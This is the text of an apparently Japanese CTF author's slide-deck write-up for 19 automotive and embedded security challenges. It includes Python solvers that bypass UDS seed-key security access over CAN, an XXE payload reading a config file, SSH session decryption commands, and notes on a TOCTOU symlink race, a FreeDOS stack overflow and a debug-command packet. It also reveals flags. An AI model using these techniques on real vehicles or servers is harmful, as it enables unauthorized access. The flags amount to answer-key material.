@@ -1,0 +1,884 @@
+
+--- PAGE 1 ---
+
+
+--- PAGE 2 ---
+2
+
+
+--- PAGE 3 ---
+3
+No. カテゴリ 問題名 概要 備考
+1 CAN VIN Hunter CAN通信のチュートリアル okzkeyさん作 / 代理解説
+2 CAN Seed-Key Leak UDS$27の攻略 okzkeyさん作 / 代理解説
+3 CAN Gateway Gremlins robots.txt -> Xpath Injection -> XXE -> .bak + UDS$27の攻略 okzkeyさんとの合作
+4 AGL AGL 1 Automotive Grade Linuxのイメージからフラグを探す
+5 AGL AGL 2
+6 AGL AGL 3
+7 AGL AGL 4
+8 AGL AGL 5
+9 CAN I Saw Our Time Pass ISO-TPログのステガノグラフィー
+10 Network Gate to the past 古いSSHの脆弱性による暗号化解除
+11 Rev Tiny crackme FreeRTOSでのCrackMe
+12 RF D's Signpost 無線信号5種の復調
+13 Misc Map data 大量ファイルからの識別
+14 Misc Weird config updater zipフォーマットの解釈違い
+15 Suspicious device Suspicious device 1 ARMバイナリのリバーシング + デバッグ機能の悪用 + クラウド侵入
+16 Suspicious device Suspicious device 2 クラウドでのDB探索
+17 Suspicious device Suspicious device 3 クラウドでのピボット + RaceConditionによる権限昇格
+18 Pwn Baby DOS pwn FreeDOSでのスタックバッファオーバーフローから任意コード実行
+19 Crypto RAMN ECU D ルート証明書の秘密鍵割り出し + UDS$29の攻略
+
+--- PAGE 4 ---
+4
+
+--- PAGE 5 ---
+5
+
+
+--- PAGE 6 ---
+6
+サーバ (コンテナ)
+canproxy.py
+server.pydispatcher (コンテナ)
+Internet dispatcher.py
+クライアント
+canproxy.py
+クライアント
+canproxy.py
+vcan0
+vcan0
+vcan0
+サーバ (コンテナ)
+canproxy.py
+server.py
+vcan0
+グローバルIPを1つにする
+ため、振り分け用サーバを
+用意
+TCP接続1つとコンテナ1つが
+紐付いているため、参加者
+間でCANバスが干渉しない
+TCP接続1つにつき
+後段のコンテナを1つ起動
+して結びつける
+
+
+--- PAGE 7 ---
+7
+root@558d95403391:/# pip3 install git+https://github.com/CaringCaribou/caringcaribou.git --break-system-packages
+root@558d95403391:/# printf "[default]¥ninterface = socketcan¥nchannel = vcan0" > $HOME/.canrc
+root@558d95403391:/# caringcaribou uds discovery
+...
++------------+------------+
+| CLIENT ID  | SERVER ID  |
++------------+------------+
+| 0x0000000f | 0x000000c0 |
+| 0x00000206 | 0x000000c0 |
+| 0x000007e0 | 0x000007e8 |
++------------+------------+
+root@c85420947806:/# caringcaribou uds dump_dids 0x7E0 0x7E8
+...
+0xf190 666c61677b76316e5f723361645f737563633373737d
+...
+root@c85420947806:/# python3
+>>> bytes.fromhex("666c61677b76316e5f723361645f737563633373737d")
+b'flag{v1n_r3ad_succ3ss}'
+>>>
+
+--- PAGE 8 ---
+8
+
+
+--- PAGE 9 ---
+9
+※デコンパイル結果の重要箇所を抜粋
+def rol32(v, c):
+v &= 4294967295
+c &= 31
+return (v << c | v >> 32 - c) & 4294967295
+def ror32(v, c):
+v &= 4294967295
+c &= 31
+return (v >> c | v << 32 - c) & 4294967295
+def derive_key(seed):
+x = seed ^ 2781028135
+x = rol32(x, 3)
+x = x + 522125569 & 4294967295
+x ^= 3735928559
+x = ror32(x, 1)
+return x & 4294967295
+Web版を使っても、docker版を使っても良い
+$ docker run --rm -it -v .:/tmp/host remnux/pylingual
+$ cd /tmp/host
+$ pylingual dealer_unlock.pyc
+
+--- PAGE 10 ---
+10
+import subprocess, time, sys
+IFACE = "vcan0"
+TX = "0x7E0"
+RX = "0x7E8"
+def uds(payload_hex: str) -> str:
+p = subprocess.Popen(
+["isotprecv", "-s", TX, "-d", RX, IFACE],
+stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
+)
+time.sleep(0.3)
+subprocess.run(
+f'echo "{payload_hex}" | isotpsend -s {TX} -d {RX} {IFACE}',
+shell=True, check=True
+)
+out, _ = p.communicate(timeout=5)
+return out.decode().strip()
+def rol32(v, c):
+    v &= 0xFFFFFFFF
+return ((v << (c&31)) | (v >> (32-(c&31)))) & 0xFFFFFFFF
+def ror32(v, c):
+v &= 0xFFFFFFFF
+return ((v >> (c&31)) | (v << (32-(c&31)))) & 0xFFFFFFFF
+def derive_key(seed):
+x = seed ^ 0xA5C31F27
+x = rol32(x, 3)
+x = (x + 0x1F1F0101) & 0xFFFFFFFF
+x ^= 0xDEADBEEF
+return ror32(x, 1)
+# 1. Extended session
+uds("10 03")
+# 2. Request seed
+resp = uds("27 01")
+seed_bytes = bytes.fromhex(resp.replace(" ", ""))[2:]  # skip 67 01
+seed = int.from_bytes(seed_bytes, "big")
+key = derive_key(seed)
+key_hex = " ".join(f"{b:02X}" for b in key.to_bytes(4, "big"))
+# 3. Send key
+uds(f"27 02 {key_hex}")
+# 4. Read flag
+resp = uds("22 13 37")
+flag = bytes.fromhex(resp.replace(" ", ""))[3:].decode()
+print(f"FLAG: {flag}")
+
+
+--- PAGE 11 ---
+11
+
+
+--- PAGE 12 ---
+12
+
+
+--- PAGE 13 ---
+13
+
+
+--- PAGE 14 ---
+14
+XPath (XML Path Language) は、
+HTMLやXML文書の中から特定の要
+素やデータを抽出（スクレイピング）し
+たり、指定したりするための言語
+
+--- PAGE 15 ---
+15
+
+
+--- PAGE 16 ---
+16
+<?xml version="1.0"?>
+<!DOCTYPE diag [
+<!ENTITY XXX SYSTEM "file:///app/config.json">
+]>
+<a>&XXX;</a>
+
+
+--- PAGE 17 ---
+17
+seedのほか、定期的に切り替わ
+るnonce (CANID:0x555で流
+れている)も使う必要があった
+
+--- PAGE 18 ---
+18
+#!/usr/bin/env python3
+import subprocess, time, re
+IFACE = "vcan0"
+TX = "0x7E0"
+RX = "0x7E8"
+XOR_MASK = 0x5A17C0DE
+def uds(payload_hex: str) -> str:
+...
+def rol32(v, c):
+...
+def get_nonce() -> int:
+"""Read one 0x555 frame and extract nonce (first 4 bytes)."""
+out = subprocess.check_output(
+["candump", "-n", "1", f"{IFACE},555:7FF"], timeout=10
+).decode()
+# candump line: "vcan0  555   [8]  A3 C1 E5 09 ..."
+m = re.search(r"555¥s+¥[¥d+¥]¥s+([¥dA-Fa-f ]+)", out)
+data = bytes.fromhex(m.group(1).replace(" ", ""))
+return int.from_bytes(data[:4], "big")
+# Capture nonce first
+nonce = get_nonce()
+print(f"nonce = {nonce:#010x}")
+# 1. Extended session
+uds("10 03")
+# 2. Request seed (level 05)
+resp = uds("27 05")
+seed_bytes = bytes.fromhex(resp.replace(" ", ""))[2:]  # skip 67 05
+seed = int.from_bytes(seed_bytes, "big")
+print(f"seed  = {seed:#010x}")
+# 3. Compute key
+key = (rol32(seed ^ XOR_MASK ^ nonce, 7) + 0x27110027) & 0xFFFFFFFF
+key_hex = " ".join(f"{b:02X}" for b in key.to_bytes(4, "big"))
+print(f"key   = {key:#010x}")
+# 4. Send key (level 06) — retry if nonce rolled
+resp = uds(f"27 06 {key_hex}")
+if resp.startswith("7F"):
+print("Key rejected. Retrying with fresh nonce...")
+nonce = get_nonce()
+key = (rol32(seed ^ XOR_MASK ^ nonce, 7) + 0x27110027) & 0xFFFFFFFF
+key_hex = " ".join(f"{b:02X}" for b in key.to_bytes(4, "big"))
+uds(f"27 06 {key_hex}")
+# 5. Read flag
+resp = uds("22 F1 A0")
+flag = bytes.fromhex(resp.replace(" ", ""))[3:].decode()
+print(f"FLAG: {flag}")
+
+--- PAGE 19 ---
+19
+
+
+--- PAGE 20 ---
+20
+qemu-system-x86_64 -accel kvm -accel tcg -machine q35 -cpu max -m 2048 -smp 2 -kernel bzImage -app
+end "root=/dev/sda1 ro console=ttyS0,115200n8 ip=dhcp noapic" -drive file=agl-ivi-demo-qt-qemux86-
+64.raw,format=raw,if=ide -device virtio-net-pci,netdev=net0 -netdev user,id=net0,hostfwd=tcp::2222
+2-:22 -serial mon:stdio -vga virtio -vnc :0
+
+
+--- PAGE 21 ---
+21
+
+
+--- PAGE 22 ---
+22
+...
+[output]
+name=Virtual-1
+mode=1920x1080
+transform=rotate-90
+...
+[output]
+name=Virtual-1
+mode=1920x1080
+transform=rotate-0
+
+--- PAGE 23 ---
+23
+怪しい何かがあるが小さすぎて読めない
+(私が埋め込んだヒントです)
+この画像はAGLに
+元々含まれるもの
+「Camera」を選択
+
+--- PAGE 24 ---
+24
+先頭から2048セクタ目(=1048576バイト目)を指定
+
+--- PAGE 25 ---
+25
+
+--- PAGE 26 ---
+26
+
+
+--- PAGE 27 ---
+27
+「？」はヒント
+のつもり
+
+--- PAGE 28 ---
+Thank you for listening.
+The flag three is IMPERIAL OPERA.
+India, Mike, Papa, Echo, Romeo, India, Alpha, Lima,
+underscore, Oscar, Papa, Echo, Romeo, Alpha.
+28
+
+--- PAGE 29 ---
+29
+
+
+--- PAGE 30 ---
+単純なstringsでは気付けないよう、
+¥x00を間に挟んでいたりします
+30
+
+--- PAGE 31 ---
+31
+ext2
+squashFS
+
+--- PAGE 32 ---
+32
+
+--- PAGE 33 ---
+33
+
+
+--- PAGE 34 ---
+34
+
+--- PAGE 35 ---
+CAN ID 0x123 の bit 0-15 が車速
+CAN ID 0x456 の bit 3 がライト状態
+CAN ID 0x789 の値がエアコン温度
+KUKSA.val / KUKSA Data Broker
+┣Vehicle.Speed
+┣Vehicle.Cabin.HVAC.Station.Row1.Left.Temperature
+┗Vehicle.Body.Lights.Beam.Low.IsOn
+Feeder / Adapter
+様々な AGL App
+サーバとして動く
+35
+
+
+--- PAGE 36 ---
+KUKSA.val / KUKSA Data Broker
+┣Vehicle.ctf.flag5.c1
+┣...
+┣Vehicle.ctf.flag5.c41
+┗Vehicle.ctf.hint: See /usr/sbin/agl-vss-helper.py
+/usr/share/vss/vss.json)
+36
+
+--- PAGE 37 ---
+37
+
+--- PAGE 38 ---
+38
+
+--- PAGE 39 ---
+$ kuksa-client ¥
+--cacertificate /etc/kuksa-val/CA.pem ¥
+--token_or_tokenfile ¥
+/etc/xdg/AGL/agl-vss-helper/agl-vss-helper.token ¥
+grpcs://127.0.0.1:55555
+<<< 'getValue Vehicle.ctf.flag5.c1'
+39
+
+--- PAGE 40 ---
+40
+
+--- PAGE 41 ---
+41
+
+--- PAGE 42 ---
+42
+
+
+--- PAGE 43 ---
+CANフレーム(ログの1行)は1つあたり8バイト
+43
+
+--- PAGE 44 ---
+$ awk '{
+ts=$1
+iface=$2
+id=$3
+data=""
+for (i=5; i<=NF; i++) {
+data=data $i
+}
+print ts " " iface " " id "#" data
+}' can.log > canplayer.log
+$ modprobe can
+$ ip link add dev vcan0 type vcan
+$ ip link set vcan0 up
+$ canplayer -l i -I canplayer.log vcan0=vcan0
+$ isotpdump -a -s 0 -d CANID vcan0
+44
+
+--- PAGE 45 ---
+いずれもflag.txtの入ったzip
+をISO-TPで転送している
+短いデータのみで構成さ
+れる(ISO-TP応答)
+CANID=700
+CANID=701
+CANID=702
+CANID=703
+CANID=708
+CANID=709
+CANID=70a
+CANID=70b
+45
+
+--- PAGE 46 ---
+本物のフラグが入ったzipは
+1つだけ
+あとは全部ダミーフラグ入り
+46
+
+--- PAGE 47 ---
+47
+
+--- PAGE 48 ---
+48
+
+--- PAGE 49 ---
+49
+
+--- PAGE 50 ---
+50
+
+--- PAGE 51 ---
+51
+
+
+--- PAGE 52 ---
+52
+
+--- PAGE 53 ---
+53
+
+--- PAGE 54 ---
+Makefileには
+-m32がないが
+同梱ライブラリ
+は32bitなため
+古い文法が
+使われている
+54
+
+--- PAGE 55 ---
+# ツールDL & 展開
+$ wget https://www.cr0.org/progs/sshfun/ssh_kex_keygen-1.1.tar.bz2 && tar xf ssh_kex_keygen-1.1.tar.bz2
+$ wget https://www.cr0.org/progs/sshfun/ssh_decoder-1.0.tar.bz2 && tar xf ssh_decoder-1.0.tar.bz2
+# PCAPをセッション単位で分解
+$ tcpick -r challenge.pcap -wRC -wRS
+# ssh_kex_keygenをビルド + ssh_decoderを実行
+$ docker run --rm -it -v `pwd`:/w -w /w --platform linux/386 debian/eol:squeeze
+$ apt-get update && apt-get install -y ruby1.8 build-essential libssl-dev
+$ cd ssh_kex_keygen-1.1 && make
+$ ruby1.8 ../ssh_decoder-1.0/ssh_decoder.rb ../tcpick__127.0.0.1_ssh.*
+32bit環境を指定 古いdebianを指定 (ruby1.8を使うため)
+55
+
+--- PAGE 56 ---
+56
+
+--- PAGE 57 ---
+57
+
+
+--- PAGE 58 ---
+kernel
+Free RTOS (Realtime OS)
+uartタスク
+- UART送受信のハンドリング
+ctfタスク
+  - 入力からハッシュを計算
+- ハッシュが想定と一致したらフラグ
+58
+
+--- PAGE 59 ---
+59
+kernel
+Free RTOS (Realtime OS)
+uartタスク ctfタスク
+
+--- PAGE 60 ---
+60
+kernel
+Free RTOS (Realtime OS)
+uartタスク ctfタスク
+...
+
+--- PAGE 61 ---
+61
+kernel
+Free RTOS (Realtime OS)
+uartタスク ctfタスク
+
+--- PAGE 62 ---
+62
+
+--- PAGE 63 ---
+63
+
+--- PAGE 64 ---
+64
+
+
+--- PAGE 65 ---
+FFTサイズを変えると、縮尺
+を変えることが出来ます
+ 65
+
+--- PAGE 66 ---
+66
+
+--- PAGE 67 ---
+67
+
+--- PAGE 68 ---
+QPSKは、4種の絶対位相が
+そのままシンボルとなる(どの位
+置を00/01/10/11とするか
+は、場合によって異なる)
+DQPSKは、「位相から位相へ
+の相対的な遷移角度」がシン
+ボルとなる(どの遷移を00/01
+/10/11とするかは、場合によ
+って異なる)
+68
+
+--- PAGE 69 ---
+69
+
+--- PAGE 70 ---
+70
+
+--- PAGE 71 ---
+キレイに４点
+におさまる
+71
+
+--- PAGE 72 ---
+72
+
+--- PAGE 73 ---
+73
+Windows版はバグが
+有りクラッシュするため、
+Linux版推奨
+
+--- PAGE 74 ---
+74
+シンボル境界で位相の変更が
+起きているのがわかる
+
+--- PAGE 75 ---
+75
+txtにでも保存しておく
+
+--- PAGE 76 ---
+76
+「位相」と「00/01/10/11」のマッピ
+ングは不明なため、総当たりする
+また先頭2ビットは消えていると思わ
+れるため、総当たりする
+#!/usr/bin/env python3
+import sys
+from itertools  import permutations
+from pathlib import Path
+import numpy as np
+outdir = Path("dqpsk_candidates ")
+outdir.mkdir(exist_ok=True)
+vals = np.array(eval("[" + sys.stdin.read() + "]"), dtype=float)
+wrap = lambda x: (x + 1.0) % 2.0 - 1.0  # Wrap phase/pi into [-1,+1): +1.20 -> -0.80, -1.85 -> +0.15
+diff = wrap(np.diff(vals))  # DQPSK uses phase differences , not absolute phases.
+base = np.rint(diff / 0.5).astype(np.uint8) & 3  # Quantize phase diff: 0,+0.5,+1.0,-0.5 -> 0,1,2,3
+for mapping in permutations (range(4)):  # Try all 4! mappings: +0,+pi/2,+pi,+3pi/2 -> 00,01,10,11.
+    pairs = np.array([mapping[x] for x in base], dtype=np.uint8)
+    for first in range(4):  # Try the missing first 2-bit symbol.
+        fixed = np.r_[first, pairs].astype(np.uint8)
+        bits = np.empty(len(fixed) * 2, dtype=np.uint8)
+        bits[0::2] = fixed >> 1
+        bits[1::2] = fixed & 1
+        data = np.packbits(bits, bitorder="big").tobytes()
+        name = f"map{''.join(map(str, mapping))}_first{first:02b}.bin"
+        (outdir / name).write_bytes(data)
+https://gist.github.com/bata24/bc90dab6a7d1d5ff1c4e384370937b01
+
+--- PAGE 77 ---
+77
+
+
+--- PAGE 78 ---
+78
+
+
+--- PAGE 79 ---
+79
+
+
+--- PAGE 80 ---
+80
+
+
+--- PAGE 81 ---
+81
+
+
+--- PAGE 82 ---
+82
+
+
+--- PAGE 83 ---
+83
+
+
+--- PAGE 84 ---
+84
+
+
+--- PAGE 85 ---
+85
+zip file
+zip file
+PK...
+PK...
+・「末尾」から「前方」に向かってマジックナンバーを探索
+・「末尾-65557」から「後方」に向かってマジックナンバーを探索
+
+--- PAGE 86 ---
+86
+zip file PK...
+ PK...
+
+--- PAGE 87 ---
+87
+zip file ({"mode":"debug"}) PK...
+ zip file ({"mode":"release"}) PK...
+
+--- PAGE 88 ---
+88
+2種類のzipを作って
+単純連結
+https://gist.github.com/bata24/8be9feb5a8b348a315ebbcacf5e7a39b
+
+--- PAGE 89 ---
+89
+
+
+--- PAGE 90 ---
+90
+IOTデバイス /usr/bin/iot-agent iot-cloud (サーバ) application
+7-zip File Managerで開いて
+探索するのが手軽
+
+--- PAGE 91 ---
+91
+SDカードをマウント
+/etc/iot-device/provision.binを用意
+
+--- PAGE 92 ---
+92
++0x00  magic       4 bytes   "IOT1"
++0x04  version     1 byte    0x01
++0x05  command     1 byte   DEBUG_EXEC:0x7f
++0x06  flags       1 byte    0x00
++0x07  reserved    1 byte    0x00
++0x08  device_id   16 bytes  "dev-7f3a91c2¥0¥0¥0¥0"
++0x18  length      4 bytes   payload length
++0x1c  payload     variable  {"token":"dbg-9b7c4a1e-prod-only", "cmd":"ls"}
++....  crc32       4 bytes   CRC32(header + payload)
+
+--- PAGE 93 ---
+93
+https://gist.github.com/bata24/39945b025a0328eb89b214477d33d2b3
+
+
+--- PAGE 94 ---
+94
+
+
+--- PAGE 95 ---
+95
+IOTデバイス /usr/bin/iot-agent iot-cloud (Webサーバ) iot_cloud.py iot-db (DBサーバ) PostgreSQL
+iot-cloud.ctf.ndias.jp:13337 5432/tcp, SSH
+5432/tcpはPostgre
+SQLの使うポート
+
+
+--- PAGE 96 ---
+96
+
+
+--- PAGE 97 ---
+97
+
+
+--- PAGE 98 ---
+98
+
+
+--- PAGE 99 ---
+99
+
+
+--- PAGE 100 ---
+100
+
+
+--- PAGE 101 ---
+101
+ファイルの詳細を取得してから
+(このときは適当な実ファイル)
+ファイルを開くまで
+(このときフラグへのsymlink)
+に差し替えたら勝ち
+Check
+Use
+この区間で、チェックした対象
+が更新されると、TOCTOU 
+Raceになる
+
+--- PAGE 102 ---
+102
+
+
+--- PAGE 103 ---
+103
+
+
+--- PAGE 104 ---
+104
+line[256]に、40(hash) + 
+2(空白) + 256(元データ)バ
+イトを書き込んでしまうスタック上のデータ
+input_len
+unused
+input_ptr
+i
+digest_ptr
+j
+saved BP
+line[256]
+saved DI
+saved SI
+saved CX
+return addr
+...
+buf[256]
+
+--- PAGE 105 ---
+105
+line[256]に、40(hash) + 
+2(空白) + 256(元データ)バ
+イトを書き込んでしまうスタック上のデータ
+？
+input_len
+unused
+input_ptr
+i
+digest_ptr
+j
+saved BP
+line[256]
+saved DI
+saved SI
+saved CX
+return addr
+...
+buf[256]
+
+--- PAGE 106 ---
+106
+#!/bin/sh
+qemu-system-i386 ¥
+-m 32M ¥
+-drive file="challenge.img",format=raw,if=floppy,snapshot=on ¥
+-boot a ¥
+-display none ¥
+-monitor none ¥
+-serial stdio ¥
+-nic none ¥
+-no-reboot ¥
+-device isa-debug-exit,iobase=0xf4,iosize=0x04 -s
+gdb -ex 'set architecture i8086' -ex 'target remote localhost:1234'
+https://github.com/bata24/gef
+
+--- PAGE 107 ---
+107
+このあたりが、セグメント機構に関
+する表示です
+素のGDBは対応していませんが、
+拡張スクリプト側で計算して表示
+するようにしています
+
+--- PAGE 108 ---
+108
+$cs=0x226b、$ip=0x09e1 なら
+(0x226b << 4) + 0x09e1 = 0x23091
+
+--- PAGE 109 ---
+109
+
+
+--- PAGE 110 ---
+110
+対象 物理アドレス セグメント表記
+物理アドレスを表現するための表記
+オフセット値
+汎用レジスタが保持する値
+本来のリターン先 0x23038 $CS:0988 0x0988
+仕込みたいリターン先 0x23b8e $SS:06fe
+スタックのアドレスとして解釈する場合は$SSが使われる
+この環境では$SS = 0x2349
+0x06fe
+$CS:14de
+コードのアドレスとして解釈する場合は$CSが使われる
+この環境では$CS = 0x226b
+0x14de
+ある物理アドレスを、複数の
+方法で指定できる
+
+--- PAGE 111 ---
+111
+https://gist.github.com/bata24/070f2feb804e9ed6f9d27b2aa8434cc7
+
+
+--- PAGE 112 ---
+112
+
+
+--- PAGE 113 ---
+113
+読み出すには$29の認証を
+突破している必要がある
+RAMNファームウェアユーザの手元
+証明書 (有効期限切れ)
+秘密鍵
+UDS
+ルートCAの公開鍵群
+DID $4E44: フラグ
+$29の認証
+
+--- PAGE 114 ---
+114
+RAMNファームウェア
+ルートCAの公開鍵群
+ルートCA Aの公開鍵
+ルートCA Bの公開鍵
+ルートCA Cの公開鍵...
+
+--- PAGE 115 ---
+115
+注: このスライドに出てくる署名機関名は架空のものです
+
+--- PAGE 116 ---
+116
+https://gist.github.com/bata24/222978e8c78bd35d64cdd8bc5c158763
+
+
+--- PAGE 117 ---
+117
+サーバ
+ramn_uds.so
+クライアント
+canproxy.pycanproxy.py
+ramn-ecud-host.py
+配布用ファイル
+ECUD.hex
+ramn_uds.c
+(UDSのコア動作)
+ramn_host_stubs.c
+(.so化に必要なラッパーなど)
+その他の様々な
+RAMNのソース
+
+--- PAGE 118 ---
+118
